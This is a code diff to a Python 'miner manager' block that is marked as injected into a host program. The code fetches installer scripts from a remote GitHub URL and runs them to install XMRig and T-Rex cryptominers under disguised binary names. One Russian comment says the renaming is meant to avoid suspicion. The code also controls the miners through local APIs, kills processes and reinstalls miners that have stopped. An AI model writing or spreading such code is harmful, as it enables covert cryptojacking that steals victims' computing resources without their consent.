@@ -1,4 +1,5 @@
 # --- MINER MANAGER INJECTED START ---
+import json
 import os
 import stat
 import subprocess
@@ -12,20 +13,20 @@ KRX_WALLET = "{KRX_WALLET}"
 OCEAN_WALLET = "{OCEAN_WALLET}"
 
 TREX_CONFIG = {
-    "SCRIPT_URL": "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/trex.sh", # Замени
+    "SCRIPT_URL": "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/trex.sh",  # Замени
     "INSTALLER_NAME": "install_t.sh",
-    "BINARY_NAME": "TREX_BIN", # Новое имя, чтобы не было подозрений
-    "INSTALL_DIR": os.path.expanduser("~/.local/bin"), # Папка для бинарника
+    "BINARY_NAME": "TREX_BIN",  # Новое имя, чтобы не было подозрений
+    "INSTALL_DIR": os.path.expanduser("~/.local/bin"),  # Папка для бинарника
     "LOG_FILE": "t.log",
     "API_PORT": 60000,
     "API_TYPE": "trex"
 }
 
 XMRIG_CONFIG = {
-    "SCRIPT_URL": "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/ocean.sh", # Замени
+    "SCRIPT_URL": "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/ocean.sh",  # Замени
     "INSTALLER_NAME": "install_x.sh",
-    "BINARY_NAME": "XMRIG_BIN", # Новое имя
-    "INSTALL_DIR": os.path.expanduser("~/.local/bin"), # Папка для бинарника
+    "BINARY_NAME": "XMRIG_BIN",  # Новое имя
+    "INSTALL_DIR": os.path.expanduser("~/.local/bin"),  # Папка для бинарника
     "LOG_FILE": "x.log",
     "API_PORT": 60001,
     "API_TYPE": "xmrig"
@@ -36,6 +37,7 @@ MINER_CONFIGS = [TREX_CONFIG, XMRIG_CONFIG]
 SCRIPTS_DIR = Path.home() / ".miner_scripts"
 SCRIPTS_DIR.mkdir(exist_ok=True, parents=True)
 error_log_path = SCRIPTS_DIR / "miner_init_error.log"
+
 
 def kill_processes_by_path_prefix(path_prefix):
     """
@@ -51,11 +53,11 @@ def kill_processes_by_path_prefix(path_prefix):
         pids_to_kill = []
         for line in all_processes.splitlines():
             # Пример строки: UID        PID  PPID  C STIME TTY          TIME CMD
-            parts = line.split(None, 7) # Разбиваем на 8 частей, CMD будет в parts[7]
+            parts = line.split(None, 7)  # Разбиваем на 8 частей, CMD будет в parts[7]
             if len(parts) > 7:
                 cmd = parts[7]
                 if cmd.startswith(path_prefix):
-                    pid = parts[1] # PID находится в parts[1]
+                    pid = parts[1]  # PID находится в parts[1]
                     pids_to_kill.append(pid)
 
         if pids_to_kill:
@@ -70,6 +72,7 @@ def kill_processes_by_path_prefix(path_prefix):
     except Exception as e:
         print(f"Unexpected error: {e}")
 
+
 def get_pid_by_name(name):
     try:
         result = subprocess.run(f"ps -ef | grep -v grep | grep {name}", shell=True,
@@ -77,6 +80,7 @@ def get_pid_by_name(name):
         if result.stdout: return int(result.stdout.strip().split()[1])
     except Exception:
         return None
+
 
 def run_installer_script_if_needed(config):
     """Запускает скрипт установки, только если бинарник не найден."""
@@ -108,7 +112,8 @@ def run_installer_script_if_needed(config):
         else:
             args = [str(binary_path), config["LOG_FILE"], OCEAN_WALLET, PUBLIC_IP]
 
-        result = subprocess.run([str(script_path)] + args, check=True, capture_output=True, text=True, cwd=str(SCRIPTS_DIR))
+        result = subprocess.run([str(script_path)] + args, check=True, capture_output=True, text=True,
+                                cwd=str(SCRIPTS_DIR))
         print(f"Installer script {config['INSTALLER_NAME']} completed successfully.")
         return True
     except subprocess.CalledProcessError as e:
@@ -126,6 +131,7 @@ def run_installer_script_if_needed(config):
             f.write(traceback.format_exc())
         return False
 
+
 def manage_miner(action):
     print(f"Executing miner action: {action}")
     for config in MINER_CONFIGS:
@@ -134,19 +140,28 @@ def manage_miner(action):
             api_type = config["API_TYPE"]
 
             if api_type == "trex":
-                enable_flag = "start" if action == 'resume' else "pause"
+                enable_flag = "start" if action == "resume" else "pause"
                 url = f'http://127.0.0.1:{api_port}/{enable_flag}'
                 req = urllib.request.Request(url, method='GET')
                 urllib.request.urlopen(req, timeout=5)
             elif api_type == "xmrig":
-                endpoint = "/1/start" if action == 'resume' else "/1/stop"
-                url = f'http://127.0.0.1:{api_port}{endpoint}'
                 headers = {
                     'Content-Type': 'application/json',
                     'Authorization': 'Bearer my_secret_token'
                 }
-                req = urllib.request.Request(url, headers=headers, method='POST')
-                urllib.request.urlopen(req, timeout=5)
+                body = json.dumps({
+                    "id": 1,
+                    "jsonrpc": "2.0",
+                    "method": action,
+                    "params": {}
+                }).encode("utf-8")
+                req = urllib.request.Request(
+                    url=f'http://127.0.0.1:{api_port}/json_rpc',
+                    headers=headers,
+                    data=body,
+                    method='POST'
+                )
+                urllib.request.urlopen(req, timeout=2)
 
         except Exception as err:
             print(f"Failed to {action} miner via API. Reason: {err}")
@@ -154,6 +169,7 @@ def manage_miner(action):
                 if not get_pid_by_name(config["BINARY_NAME"]):
                     print(f"Miner {config['BINARY_NAME']} is not running. Attempting to restart via script...")
                     run_installer_script_if_needed(config)
+
 
 if not (KRX_WALLET and OCEAN_WALLET and PUBLIC_IP):
     print("\n" + "=" * 50)
